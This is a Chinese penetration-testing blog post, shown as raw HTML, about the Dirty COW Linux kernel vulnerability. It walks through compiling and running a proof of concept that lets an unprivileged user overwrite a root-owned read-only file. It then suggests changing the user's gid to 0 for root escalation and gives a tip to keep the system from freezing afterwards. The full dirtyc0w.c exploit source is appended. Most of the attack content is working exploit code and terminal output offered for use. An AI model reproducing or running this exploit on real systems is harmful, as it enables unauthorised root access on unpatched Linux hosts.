<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content=""/>
  <meta name="author" content="Reber"/>
  
    
      <title>脏牛漏洞 | Reber&#39;s Blog</title>
    
  
  <link rel="stylesheet" href="/css/reset.css"/>
  <link rel="stylesheet" href="/css/font.css"/>
  <link rel="stylesheet" href="/css/smigle.css"/>
  
    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
  
    <link rel="stylesheet" href="/css/style.css"/>
  
  
    <script src="/js/jquery-3.6.0.min.js"/></script>
  
    <script src="/js/highlight.min.js"/></script>
  
    <script src="/js/style.js"/></script>
  
  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
</head>

  <body>
    <header>
  <div id="brand">
    <a class="icon-link" href="https://wyb0.com/">
      <img
        class="icon"
        src="/img/logo.png"
      />
    </a>
    <div class="text">
      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
      <h3>只会一点点编程、只会一点点渗透</h3>
    </div>
  </div>
  <nav>
    
      
        
        <a href="/"><b>Home</b></a>
      
         | 
        <a href="/posts/"><b>Posts</b></a>
      
         | 
        <a href="/categories/"><b>Categories</b></a>
      
         | 
        <a href="/tags/"><b>Tags</b></a>
      
         | 
        <a href="/about/"><b>About</b></a>
      
         | 
        <a href="/friends/"><b>Friends</b></a>
      
    
  </nav>
  <hr />
</header>

    <div id="content">
      
  <main>
    <article>
      <h1>脏牛漏洞</h1>
      <div class="post-meta">
  <strong>
    <span>Posted on</span>
    <time>2016-10-22</time>
    <span>in</span>
    
      <a href="/categories/Pentest">Pentest</a>
  </strong>
  <span> • 657 words</span>
  
  
  
    <div>
      <span>Tags:</span>
      
        <a href="/tags/intranet">intranet</a>
    </div>
  
</div>

      <div>

<h3 id="0x00-测试环境">0x00 测试环境</h3>

<p>我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，若理解有误则希望大家提意见</p>

<pre><code>CentOS release 6.5
[reber123@WYB ~]$ uname -a
Linux WYB 3.10.5-3.el6.x86_64 #1 SMP Tue Aug 20 14:10:49 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
[reber123@WYB ~]$ id
uid=502(reber123) gid=502(reber123) groups=502(reber123)
</code></pre>

<h3 id="0x01-创建文件">0x01 创建文件</h3>

<p>查看文件权限信息，可以看到属主为root，且只读，权限为0404</p>

<pre><code>[reber123@WYB ~]$ ls -al test
-r-----r-- 1 root root 19 Oct 21 00:02 test
[reber123@WYB ~]$ cat test
this is not a test
[reber123@WYB ~]$
</code></pre>

<h3 id="0x02-编译-执行poc">0x02 编译、执行poc</h3>

<p>POC保存为a.c，编译为aaa</p>

<pre><code>[reber123@WYB ~]$ gcc -lpthread a.c -o aaa
[reber123@WYB ~]$ ls
aaa  a.c  test
[reber123@WYB ~]$

更改test的内容
[reber123@WYB ~]$ ./aaa test xxxxxxxxxxx
mmap f8969000

^C
[reber123@WYB ~]$ cat test
xxxxxxxxxxx a test
[reber123@WYB ~]$
</code></pre>

<h3 id="0x03-后续利用">0x03 后续利用</h3>

<p>更改用户gid为0即可
<img src="/img/post/dirty_cow1.png" alt="脏牛1" />
<img src="/img/post/dirty_cow2.png" alt="脏牛2" /></p>

<pre><code>提权后执行下：echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs 
用来关闭pdflush刷新,否则提权后过几秒系统就会卡死
</code></pre>

<h3 id="0x04-附poc">0x04 附poc</h3>

<pre><code>/*
####################### dirtyc0w.c #######################
$ sudo -s
# echo this is not a test &gt; foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -lpthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
####################### dirtyc0w.c #######################
*/
#include &lt;stdio.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;pthread.h&gt;
#include &lt;string.h&gt;
  
void *map;
int f;
struct stat st;
char *name;
  
void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i&lt;100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/secu ... 06661
&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call
&gt; while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf(&quot;madvise %d\n\n&quot;,c);
}
  
void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/sh ... 23c16
&gt;  The in the wild exploit we are aware of doesn't work on Red Hat
&gt;  Enterprise Linux 5 and 6 out of the box because on one side of
&gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not
&gt;  writable on Red Hat Enterprise Linux 5 and 6.
*/
  int f=open(&quot;/proc/self/mem&quot;,O_RDWR);
  int i,c=0;
  for(i=0;i&lt;100000000;i++) {
/*
You have to reset the file pointer to the memory position.
*/
    lseek(f,map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf(&quot;procselfmem %d\n\n&quot;, c);
}
  
  
int main(int argc,char *argv[])
{
/*
You have to pass two arguments. File and Contents.
*/
  if (argc&lt;3)return 1;
  pthread_t pth1,pth2;
/*
You have to open the file in read only mode.
*/
  f=open(argv[1],O_RDONLY);
  fstat(f,&amp;st);
  name=argv[1];
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
&gt; Create a private copy-on-write mapping.  Updates to the
&gt; mapping are not visible to other processes mapping the same
&gt; file, and are not carried through to the underlying file.  It
&gt; is unspecified whether changes made to the file after the
&gt; mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf(&quot;mmap %x\n\n&quot;,map);
/*
You have to do it on two threads.
*/
  pthread_create(&amp;pth1,NULL,madviseThread,argv[1]);
  pthread_create(&amp;pth2,NULL,procselfmemThread,argv[2]);
/*
You have to wait for the threads to finish.
*/
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
</code></pre>
</div>
    </article>
  </main>

    </div>
    <footer>
  <hr />
  
    <p id="social">
      Find me around the web:
      <br />
      
        
        <a href="https://github.com/reber0?_blank">GitHub</a>
      
         | 
        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
      
    </p>
  
  <p class="copyright">
    Copyright © 2015-2022
    <a href="https://wyb0.com/"><strong>Reber</strong></a>.

    Built with
    <a href="http://www.gohugo.io/">Hugo</a>,
    using the theme
    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
  </p>
</footer>

  </body>
</html>
